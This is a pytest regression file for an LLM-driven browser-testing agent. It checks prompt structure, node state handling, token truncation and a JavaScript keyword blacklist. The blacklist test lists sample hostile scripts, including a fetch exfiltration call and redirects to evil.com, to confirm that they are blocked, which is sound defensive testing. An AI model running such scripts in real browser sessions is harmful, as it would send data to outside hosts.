"""tests/core/test_l2_prompts.py — L2 Prompt Regression Test.

Verifies L2 (execution_graph) prompt contracts:
  1. get_execution_system_prompt: 5-section XML structure (V1.6-ish), credentials
     stripped, session_summary injection slot present, PRD rules/focus_areas not
     echoed verbatim (Phase C will wire them, this asserts the SLOT is reserved)
  2. get_step_prompt: step counter, current step text, fallback when out-of-bounds
  3. get_assertion_prompt: tool_calls, change_report, expected, current_step_text,
     image content slot (screenshot_after)
  4. Inter-node contract (state continuity):
     - record_node builds StepResult that captures _last_tool_calls + _last_assertion
     - assert_node sets _last_assertion with valid status enum
     - decide_node reads from state and forwards to LLM (mocked)
  5. Token-aware truncation: messages list after record_node never exceeds budget
  6. evaluate_js keyword blacklist rejects 5 dangerous patterns

Usage:
    # Mocked test (no LLM cost): pytest tests/core/test_l2_prompts.py -v
    # Live test (real LLM, costs tokens): L2_LIVE=1 python -m pytest tests/core/test_l2_prompts.py -v -s
"""
from __future__ import annotations

import asyncio
import os
import sys
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

FIXTURES_DIR = Path(__file__).resolve().parents[2] / "data" / "fixtures"
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def sample_test_case():
    from core.interfaces import TestCase
    return TestCase(
        id="TC-001",
        title="登录成功",
        description="用 practice 账号登录后跳转 /secure",
        preconditions=[],
        steps=["打开登录页", "输入用户名", "输入密码", "点击登录"],
        expected="跳转 /secure 并显示 'You logged into a secure area!'",
        priority="high",
        category="functional",
    )


@pytest.fixture
def sample_task_config():
    return {
        "target_url": "https://practice.expandtesting.com/login",
        "accounts": [{"role": "测试员", "username": "practice", "password": "SuperSecretPassword!"}],
        "session_summary": "TC-000 已完成: 用 practice/SuperSecretPassword! 登录成功, 已跳转到 /secure。",
    }


# ---------------------------------------------------------------------------
# A1.1: get_execution_system_prompt structure
# ---------------------------------------------------------------------------

def test_execution_prompt_has_test_case_metadata(sample_test_case, sample_task_config):
    from agents.ui.prompts import get_execution_system_prompt

    prompt = get_execution_system_prompt(sample_test_case, sample_task_config)
    assert "TC-001" in prompt
    assert "登录成功" in prompt
    assert "You logged into a secure area" in prompt  # expected result echoed


def test_execution_prompt_does_not_leak_plaintext_password_when_session_summary_present(
    sample_test_case, sample_task_config
):
    """V2.0 P1: 账号密码剥离. 本期先验证 'password 是 session_summary 残留, 不应继续明文'.

    Note: Phase B 会把 accounts 改成 "<use test_c instead of echoing>".
    本测试是 regression net — 任何未来改动破坏了"不重复明文密码"应失败。
    """
    from agents.ui.prompts import get_execution_system_prompt

    cfg = dict(sample_task_config)
    cfg["session_summary"] = "已用 practice 账号登录"  # 摘要里不带明文密码
    prompt = get_execution_system_prompt(sample_test_case, cfg)
    # accounts 块是 Phase B 要剥离的, 现在还在, 所以 password 暂时会出现
    # 但 session_summary 块不应引入 password
    if "<session_summary>" in prompt or "前面已完成的测试用例摘要" in prompt:
        assert "SuperSecretPassword" not in prompt.split("前面已完成的测试用例摘要")[-1][:5000]


def test_execution_prompt_has_session_summary_slot(sample_test_case, sample_task_config):
    """A3 contract: system_prompt 应有 session_summary 注入点 (Phase A 实现由 decide_node 注入,
    但 prompt 内部要预留章节, 以便 decide_node 用统一方式拼接)."""
    from agents.ui.prompts import get_execution_system_prompt

    prompt = get_execution_system_prompt(sample_test_case, sample_task_config)
    # 当 session_summary 传入时, decide_node 会注入到 system_prompt 顶部
    # 但 prompt 本身不强制包含 — 验证 get_execution_system_prompt 可被独立调用
    # 而不抛异常 (确保它不依赖 session_summary)
    assert isinstance(prompt, str)
    assert len(prompt) > 100


def test_execution_prompt_works_without_optional_fields(sample_test_case):
    """边界: 没传 task_config 或 accounts 都不崩."""
    from agents.ui.prompts import get_execution_system_prompt

    p1 = get_execution_system_prompt(sample_test_case)
    p2 = get_execution_system_prompt(sample_test_case, None)
    p3 = get_execution_system_prompt(sample_test_case, {})
    assert all(isinstance(p, str) and len(p) > 100 for p in [p1, p2, p3])


# ---------------------------------------------------------------------------
# A1.2: get_step_prompt
# ---------------------------------------------------------------------------

def test_step_prompt_in_range(sample_test_case):
    from agents.ui.prompts import get_step_prompt

    p = get_step_prompt(0, sample_test_case)
    assert "1/4" in p
    assert "打开登录页" in p


def test_step_prompt_out_of_range(sample_test_case):
    from agents.ui.prompts import get_step_prompt

    p = get_step_prompt(10, sample_test_case)  # beyond steps
    assert "验证预期结果" in p or "11" in p


# ---------------------------------------------------------------------------
# A1.3: get_assertion_prompt
# ---------------------------------------------------------------------------

def test_assertion_prompt_contains_expected_fields(sample_test_case):
    from agents.ui.prompts import get_assertion_prompt
    from core.interfaces import ChangeReport

    cr = ChangeReport(url_changed=True, url_before="a", url_after="b", new_elements=["#1"])
    p = get_assertion_prompt(
        tool_calls=[{"name": "click", "args": {"target": "#submit-login"}, "id": "c1"}],
        change_report=cr,
        expected=sample_test_case.expected,
        current_step_text="点击登录按钮",
        page_info={"url": "https://practice.expandtesting.com/secure", "title": "Secure", "interactive_elements": []},
    )
    assert "click" in p
    assert "submit-login" in p
    assert "URL" in p or "url" in p.lower()  # change_report URL 字段被格式化进 prompt
    assert "You logged into a secure area" in p
    assert "PASS" in p and "FAIL" in p and "INCONCLUSIVE" in p  # status enum documented


def test_assertion_prompt_handles_empty_change(sample_test_case):
    from agents.ui.prompts import get_assertion_prompt
    from core.interfaces import ChangeReport

    p = get_assertion_prompt(
        tool_calls=[],
        change_report=ChangeReport(),
        expected="anything",
        current_step_text="step",
    )
    assert "无明显变化" in p
    assert "anything" in p


# ---------------------------------------------------------------------------
# A1.4: decide_node session_summary injection (A3)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_decide_node_injects_session_summary_into_system_message(
    sample_test_case, sample_task_config
):
    """A3 contract: decide_node 应把 state.session_summary 拼到 system_prompt 顶部,
    而不是依赖 caller 在 messages[0] 塞 SystemMessage (V1.7 漏: decide_node 每步
    insert(0, SystemMessage(...)) 会覆盖前一个 case 留下的 session summary)."""
    from agents.ui.execution_graph import decide_node
    from langchain_core.messages import SystemMessage, HumanMessage

    state = {
        "task_id": "t1",
        "test_plan": [sample_test_case],
        "current_index": 0,
        "current_step": 0,
        "consecutive_failures": 0,
        "page_info": {"url": "https://practice.expandtesting.com/secure", "title": "Secure", "interactive_elements": []},
        "screenshot": "",
        "state_before": {},
        "state_after": {},
        "task_config": dict(sample_task_config),
        "session_summary": "TC-000 已登录成功, 跳到 /secure, 验证无验证码拦截。",
        "messages": [],
    }

    mock_llm = MagicMock()
    mock_llm_with_tools = MagicMock()
    captured: dict[str, Any] = {}
    async def fake_ainvoke(messages):
        captured["messages"] = list(messages)
        from langchain_core.messages import AIMessage
        return AIMessage(content="ok", tool_calls=[])
    mock_llm_with_tools.ainvoke = fake_ainvoke
    mock_llm.bind_tools = MagicMock(return_value=mock_llm_with_tools)

    with patch("agents.ui.execution_graph.get_llm_client", return_value=mock_llm), \
         patch("agents.ui.execution_graph.get_execution_system_prompt", return_value="BASE_SYS_PROMPT"), \
         patch("agents.ui.execution_graph.get_step_prompt", return_value="STEP"), \
         patch("agents.ui.execution_graph._format_page_info", return_value="PAGE"), \
         patch("core.memory_utils.retrieve_memories", new=AsyncMock(return_value="")), \
         patch("agents.ui.tools.set_current_task"):
        await decide_node(state)

    msgs = captured.get("messages", [])
    assert msgs, "decide_node should have called the LLM"
    sys_msg = next((m for m in msgs if isinstance(m, SystemMessage)), None)
    assert sys_msg is not None, "system message missing"
    assert "TC-000" in sys_msg.content, "session_summary not injected into system message"
    assert "BASE_SYS_PROMPT" in sys_msg.content, "base system prompt not included"


# ---------------------------------------------------------------------------
# A1.5: execute_node tool failure → consecutive_failures (A4)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_execute_node_failure_increments_consecutive_failures(sample_test_case):
    """A4 contract: 工具失败应计入 consecutive_failures, 而非沉默."""
    from agents.ui.execution_graph import execute_node
    from langchain_core.messages import AIMessage

    ai = AIMessage(content="x", tool_calls=[{"name": "click", "args": {"target": "#999"}, "id": "c1"}])
    state = {
        "messages": [ai],
        "current_step": 0,
        "consecutive_failures": 0,
        "task_id": "t1",
        "state_before": {},
    }

    mock_tool = MagicMock()
    mock_tool.ainvoke = AsyncMock(side_effect=Exception("元素不存在"))
    with patch("agents.ui.execution_graph.tools_by_name", {"click": mock_tool}), \
         patch("agents.ui.execution_graph.get_current_page", return_value=MagicMock()), \
         patch("agents.ui.execution_graph.extract_page_semantics", new_callable=AsyncMock) as mock_sem:
        mock_sem.return_value = {"url": "x", "title": "x", "interactive_elements": []}
        result = await execute_node(state)

    assert result.get("consecutive_failures", 0) == 1, \
        f"expected consecutive_failures=1, got {result.get('consecutive_failures')}"


@pytest.mark.asyncio
async def test_execute_node_success_does_not_increment(sample_test_case):
    """成功执行不增加 consecutive_failures (从 0 仍是 0, 或保持 1)."""
    from agents.ui.execution_graph import execute_node
    from langchain_core.messages import AIMessage

    ai = AIMessage(content="x", tool_calls=[{"name": "click", "args": {"target": "#submit"}, "id": "c1"}])
    state = {"messages": [ai], "current_step": 0, "consecutive_failures": 0, "task_id": "t1", "state_before": {}}
    mock_tool = MagicMock()
    mock_tool.ainvoke = AsyncMock(return_value="OK")
    with patch("agents.ui.execution_graph.tools_by_name", {"click": mock_tool}), \
         patch("agents.ui.execution_graph.get_current_page", return_value=MagicMock()), \
         patch("agents.ui.execution_graph.extract_page_semantics", new_callable=AsyncMock) as mock_sem:
        mock_sem.return_value = {"url": "x", "title": "x", "interactive_elements": []}
        result = await execute_node(state)

    assert result.get("consecutive_failures", 0) == 0


# ---------------------------------------------------------------------------
# A1.6: _fallback_assertion (A6)
# ---------------------------------------------------------------------------

def test_fallback_assertion_on_json_parse_failure():
    """A6 contract: 解析 LLM 输出 JSON 失败时, 应走 _fallback_assertion() 返回 inconclusive."""
    from core.interfaces import AssertionResult

    # The fallback should be importable from execution_graph for testability
    from agents.ui.execution_graph import _fallback_assertion

    result = _fallback_assertion(reasoning="some gibberish no json at all", parse_error=ValueError("bad"))
    assert isinstance(result, AssertionResult)
    assert result.status == "inconclusive"
    assert "JSON" in result.reasoning or "解析" in result.reasoning or "fallback" in result.reasoning.lower()


def test_fallback_assertion_with_partial_json():
    """边界: 部分 JSON (被截断) 也走 fallback."""
    from agents.ui.execution_graph import _fallback_assertion

    r1 = _fallback_assertion('{"status": "PA', parse_error=ValueError("unterminated"))
    assert r1.status == "inconclusive"
    r2 = _fallback_assertion('thinking then no json', parse_error=ValueError("no json"))
    assert r2.status == "inconclusive"


# ---------------------------------------------------------------------------
# A1.7: token-aware truncation in record_node (A2)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_record_node_truncates_messages_under_token_budget():
    """A2 contract: 当 messages 累计 token 超 budget, record_node 应清掉中间 (老) 消息,
    保留 system + 最近 10 条."""
    from agents.ui.execution_graph import record_node
    from langchain_core.messages import AIMessage, HumanMessage, SystemMessage, RemoveMessage

    # 构造 20 条很长的 AIMessage (每条 ~5K chars = ~1.2K tokens)
    big = "x" * 5000
    msgs = [SystemMessage(content="SYS")]
    for i in range(20):
        msgs.append(AIMessage(content=big, tool_calls=[]))
    msgs.append(HumanMessage(content="final user"))

    state = {
        "messages": msgs,
        "current_step": 1,
        "consecutive_failures": 0,
        "_last_tool_result": "r",
        "_last_change_report": None,
        "_last_assertion": None,
    }
    with patch.dict(os.environ, {"L2_TOKEN_BUDGET": "5000"}):
        result = await record_node(state)

    # Should have RemoveMessage entries for trimmed middle
    if "messages" in result:
        removes = [m for m in result["messages"] if isinstance(m, RemoveMessage)]
        assert len(removes) > 0, "expected token budget to trigger trimming"


@pytest.mark.asyncio
async def test_record_node_no_trim_under_budget():
    """短 messages 不应 trim."""
    from agents.ui.execution_graph import record_node
    from langchain_core.messages import AIMessage, HumanMessage, SystemMessage

    msgs = [SystemMessage(content="SYS"), HumanMessage(content="step"), AIMessage(content="x", tool_calls=[])]
    state = {"messages": msgs, "current_step": 1, "consecutive_failures": 0, "_last_tool_result": "r", "_last_change_report": None, "_last_assertion": None}
    with patch.dict(os.environ, {"L2_TOKEN_BUDGET": "50000"}):
        result = await record_node(state)
    assert "messages" not in result


# ---------------------------------------------------------------------------
# A1.8: evaluate_js keyword blacklist (A5)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
async def test_evaluate_js_blocks_page_goto():
    from agents.ui.tools import evaluate_js

    # 5 banned keywords from the V2.0 plan
    for bad in [
        "page.goto('https://evil.com')",
        "page.evaluate('alert(1)')",
        "window.location = 'https://evil.com'",
        "document.location.href = 'https://evil.com'",
        "fetch('https://evil.com/exfil')",
    ]:
        result = await evaluate_js.ainvoke(bad)
        assert "拒绝" in result or "禁止" in result or "blocked" in result.lower() or "blacklist" in result.lower(), \
            f"expected blacklist rejection for: {bad!r}, got: {result!r}"


@pytest.mark.asyncio
async def test_evaluate_js_allows_safe_scripts():
    from agents.ui.tools import evaluate_js
    from unittest.mock import AsyncMock

    # Safe scripts (no banned keywords) should pass the blacklist and hit page.evaluate
    with patch("agents.ui.tools.get_current_page") as mock_gp:
        page = MagicMock()
        page.evaluate = AsyncMock(return_value="ok")
        mock_gp.return_value = page
        for safe in ["return document.title", "() => document.title", "document.querySelectorAll('a').length"]:
            result = await evaluate_js.ainvoke(safe)
            assert "拒绝" not in result and "禁止" not in result, \
                f"safe script blocked: {safe!r} -> {result!r}"


# ---------------------------------------------------------------------------
# Live integration test (costs tokens, requires L2_LIVE=1)
# ---------------------------------------------------------------------------

@pytest.mark.asyncio
@pytest.mark.skipif(not os.getenv("L2_LIVE"), reason="set L2_LIVE=1 to run with real LLM")
async def test_l2_live_practice_login(sample_test_case, sample_task_config):
    """End-to-end L2 live test against practice.expandtesting.com.

    Verifies decide_node -> execute_node -> assert_node -> record_node loop works
    with a real LLM and the public test site.
    """
    from agents.ui.execution_graph import build_execution_graph
    from langchain_core.messages import SystemMessage
    from agents.ui.tools import set_current_page, set_current_task

    from playwright.sync_api import sync_playwright
    p = sync_playwright().start()
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()
    page.goto("https://practice.expandtesting.com/login", wait_until="domcontentloaded", timeout=15000)

    # Bind to the langchain tools page registry
    set_current_task("live-task")
    set_current_page(page, task_id="live-task")

    state = {
        "task_id": "live-task",
        "task_plan": [sample_test_case],
        "setups": {},
        "current_index": 0,
        "current_step": 0,
        "results": [],
        "consecutive_failures": 0,
        "page_info": {},
        "screenshot": "",
        "state_before": {},
        "state_after": {},
        "task_config": dict(sample_task_config),
        "session_summary": "",
        "messages": [SystemMessage(content="Start: 登录测试")],
    }

    graph = build_execution_graph()
    final_state = dict(state)
    try:
        async for event in graph.astream(state):
            for k, v in (event.items() if isinstance(event, dict) else []):
                if isinstance(v, dict):
                    final_state.update(v)
    finally:
        browser.close()
        p.stop()

    assert final_state.get("consecutive_failures", 0) < int(os.getenv("MAX_CONSECUTIVE_FAILURES", "3")), \
        f"too many failures: {final_state.get('consecutive_failures')}"
    steps = final_state.get("_collected_steps", [])
    assert steps, "no steps collected"
    final_assertion = steps[-1].assertion
    assert final_assertion is not None
    print(f"\n[live] steps={len(steps)} final_status={final_assertion.status}")
